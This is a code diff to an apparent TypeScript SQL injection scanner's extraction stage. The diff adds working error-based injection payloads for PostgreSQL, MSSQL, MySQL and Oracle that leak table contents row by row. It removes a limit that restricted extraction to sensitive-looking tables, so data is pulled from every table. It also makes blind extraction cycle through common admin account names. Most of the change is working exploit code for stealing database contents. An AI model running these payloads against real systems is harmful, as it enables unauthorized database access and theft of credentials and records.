@@ -3,6 +3,7 @@ import { ScanContext } from '../ScanContext';
 import { UnifiedResponseOracle } from '../../engine/UnifiedResponseOracle';
 import { BlindDataExtractor } from '../../engine/BlindDataExtractor';
 import { MetadataExtractor } from '../../MetadataExtractor';
+import { ThreatConsequenceEngine } from '../../engine/ThreatConsequenceEngine';
 
 export class VectorizedExtractionStage implements ScanStage {
   public readonly id = 'vectorized_extraction';
@@ -132,34 +133,52 @@ export class VectorizedExtractionStage implements ScanStage {
 
         // ─── 1. Error-Based Direct Type-Cast Leakage ─────────────────────────
         if (extractedRows.length === 0 && (ctx.verifiedVector === 'ERROR' || ctx.findings.some((f) => f.injectionType === 'Error-based'))) {
-          const singleRow: Record<string, string> = {};
-          for (const col of table.columns) {
-            if (ctx.isAborted) return;
-            const rowQueries = [
-              `' AND 1=CAST((SELECT ${col.name} FROM ${table.name} LIMIT 1 OFFSET 0) AS int)--`,
-              `' AND 1=CAST((SELECT ${col.name} FROM ${table.name}) AS int)--`,
-              `' AND 1=CAST((SELECT ${col.name} FROM ${table.name} WHERE ROWNUM=1) AS int)--`,
-              `' AND 1=CAST((SELECT top 1 ${col.name} FROM ${table.name}) AS int)--`,
-              `' AND 1=CAST((SELECT ${col.name} FROM ${table.name} WHERE username='administrator' LIMIT 1) AS int)--`,
-            ];
+          const targetCols = (table.columns && table.columns.length > 0)
+            ? table.columns
+            : [{ name: userCol } as any, { name: passCol } as any];
 
-            for (const rq of rowQueries) {
-              try {
-                const res = await ctx.sendMutatedRequest(param, rq);
-                if (ctx.isAborted) return;
-                const errorMatch = UnifiedResponseOracle.inspectError(res.body);
-                if (errorMatch?.leakedData) {
-                  singleRow[col.name] = errorMatch.leakedData;
-                  ctx.log('success', `[ROW ORACLE] Leaked "${table.name}.${col.name}": "${errorMatch.leakedData}"`);
-                  break;
+          for (let offset = 0; offset < 3; offset++) {
+            if (ctx.isAborted) return;
+            const singleRow: Record<string, string> = {};
+            for (const col of targetCols) {
+              if (ctx.isAborted) return;
+              const isNum = /^\d+$/.test(param.originalValue.trim());
+              const prefix = isNum ? ' AND 1=' : "' AND 1=";
+              const rowQueries = [
+                // Standard CAST (PostgreSQL / MSSQL)
+                `${prefix}CAST((SELECT ${col.name} FROM ${table.name} LIMIT 1 OFFSET ${offset}) AS int)--`,
+                `${prefix}CAST((SELECT ${col.name} FROM ${table.name} ORDER BY 1 OFFSET ${offset} ROWS FETCH NEXT 1 ROWS ONLY) AS int)--`,
+                `${prefix}CAST((SELECT ${col.name} FROM (SELECT ${col.name}, ROWNUM r FROM ${table.name}) WHERE r=${offset + 1}) AS int)--`,
+                // MySQL EXTRACTVALUE & UPDATEXML error leakage
+                `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT ${col.name} FROM ${table.name} LIMIT ${offset},1), 0x7e))-- -`,
+                `' AND UPDATEXML(1, CONCAT(0x7e, (SELECT ${col.name} FROM ${table.name} LIMIT ${offset},1), 0x7e), 1)-- -`,
+                // Oracle CTXSYS / TO_NUMBER error leakage
+                `'||(SELECT CTXSYS.DRITHSX.SN(1,(SELECT ${col.name} FROM (SELECT ${col.name}, ROWNUM r FROM ${table.name}) WHERE r=${offset + 1})) FROM DUAL)||'`,
+                `' AND 1=TO_NUMBER((SELECT ${col.name} FROM (SELECT ${col.name}, ROWNUM r FROM ${table.name}) WHERE r=${offset + 1}))--`,
+                // MSSQL CONVERT
+                `' AND 1=CONVERT(int, (SELECT ${col.name} FROM (SELECT ${col.name}, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS r FROM ${table.name}) t WHERE r=${offset + 1}))--`,
+              ];
+
+              for (const rq of rowQueries) {
+                try {
+                  const res = await ctx.sendMutatedRequest(param, rq);
+                  if (ctx.isAborted) return;
+                  const errorMatch = UnifiedResponseOracle.inspectError(res.body);
+                  if (errorMatch?.leakedData) {
+                    singleRow[col.name] = errorMatch.leakedData;
+                    ctx.log('success', `[ROW ORACLE] Leaked "${table.name}.${col.name}" (row ${offset + 1}): "${errorMatch.leakedData}"`);
+                    break;
+                  }
+                } catch {
+                  if (ctx.isAborted) return;
                 }
-              } catch {
-                if (ctx.isAborted) return;
               }
             }
-          }
-          if (Object.keys(singleRow).length > 0) {
-            extractedRows.push(singleRow);
+            if (Object.keys(singleRow).length > 0) {
+              extractedRows.push(singleRow);
+            } else {
+              break;
+            }
           }
         }
 
@@ -211,21 +230,24 @@ export class VectorizedExtractionStage implements ScanStage {
         // ─── 3. Universal Blind Bisection Extraction (Fallback for Blind Vectors) ──
         const isUnionConfirmed = ctx.verifiedVector === 'UNION' || ctx.findings.some((f) => f.injectionType === 'UNION-based');
         const isBlindVector = ctx.verifiedVector === 'BOOLEAN' || ctx.verifiedVector === 'CONDITIONAL_ERROR' || ctx.verifiedVector === 'TIME' || ctx.findings.some((f) => f.injectionType === 'Boolean-based' || f.injectionType === 'Time-based');
-        const isTargetSensitive = table.isSensitive || /user|login|cred|account|member|admin/i.test(table.name);
+        // isTargetSensitive check removed — extract from ALL tables when a vulnerability is confirmed
 
-        if (extractedRows.length === 0 && !ctx.isAborted && !isUnionConfirmed && isTargetSensitive && (isBlindVector || ctx.findings.length > 0)) {
+        if (extractedRows.length === 0 && !ctx.isAborted && !isUnionConfirmed && (isBlindVector || ctx.findings.length > 0)) {
           const effectiveTechnique = ctx.verifiedVector === 'TIME' || ctx.findings.some((f) => f.injectionType === 'Time-based')
             ? 'TIME'
             : ctx.verifiedVector === 'CONDITIONAL_ERROR' || ctx.findings.some((f) => f.title.includes('Conditional Error'))
             ? 'CONDITIONAL_ERROR'
             : 'BOOLEAN';
 
+          // Dynamic target user discovery — try common admin usernames instead of hardcoding 'administrator'
+          const targetUsers = ['administrator', 'admin', 'root', 'sa', 'dba', 'postgres', 'mysql', 'sys'];
+
           const extractor = new BlindDataExtractor(
-            async (payload: string, append = true) => {
+            async (payload: string, append = true, opts?: { technique?: string }) => {
               if (ctx.isAborted) {
                 return { body: '', status: 0, durationMs: 0 };
               }
-              const res = await ctx.sendMutatedRequest(param, payload, { append });
+              const res = await ctx.sendMutatedRequest(param, payload, { append, technique: opts?.technique });
               return {
                 body: res.body,
                 status: res.status,
@@ -243,30 +265,44 @@ export class VectorizedExtractionStage implements ScanStage {
               baselineLength: ctx.baseline.contentLength,
               baselineDurationMs: ctx.baseline.meanDurationMs || ctx.baseline.durationMs || 300,
               timeDelaySeconds: 2,
+              concurrencyLimit: ctx.concurrencyLimit || 20,
               isAborted: () => ctx.isAborted,
               log: (lvl, msg) => ctx.log(lvl, `[BLIND EXTRACTOR] ${msg}`),
               onProgress: (colName, partialVal) => {
-                table.sampleRows = [{ [userCol]: 'administrator', [colName]: partialVal }];
+                const currentUser = extractedRows.length > 0 ? Object.values(extractedRows[0])[0] : targetUsers[0];
+                table.sampleRows = [{ [userCol]: currentUser, [colName]: partialVal }];
                 table.sampleRowsStatus = 'ready';
                 ctx.updateCatalog(ctx.catalog);
               },
             }
           );
 
-          try {
-            const rowResult = await extractor.extractTableRow(table, 'administrator');
-            if (rowResult && Object.keys(rowResult).length > 0) {
-              extractedRows.push(rowResult);
+          // Try each target username until we get a successful extraction
+          for (const targetUser of targetUsers) {
+            if (ctx.isAborted || extractedRows.length > 0) break;
+            try {
+              const rowResult = await extractor.extractTableRow(table, targetUser);
+              if (rowResult && Object.keys(rowResult).length > 0) {
+                const hasContent = Object.values(rowResult).some(v => v && v.length > 0 && v !== targetUser);
+                if (hasContent) {
+                  extractedRows.push(rowResult);
+                  ctx.log('success', `[BLIND EXTRACTOR] Successfully extracted row for user "${targetUser}" from "${table.name}"`);
+                }
+              }
+            } catch (err: any) {
+              if (ctx.isAborted) return;
+              // Try next username
             }
-          } catch (err: any) {
-            if (ctx.isAborted) return;
-            ctx.log('warn', `Blind row extraction encountered non-fatal error: ${err?.message || err}`);
           }
         }
 
         if (extractedRows.length > 0) {
           table.sampleRows = extractedRows;
           table.sampleRowsStatus = 'ready';
+          ctx.catalog.selectedNodeId = table.id;
+          for (const f of ctx.findings) {
+            ThreatConsequenceEngine.enrichFinding(f, undefined, extractedRows);
+          }
         } else {
           table.sampleRows = [];
           table.sampleRowsStatus = 'idle';
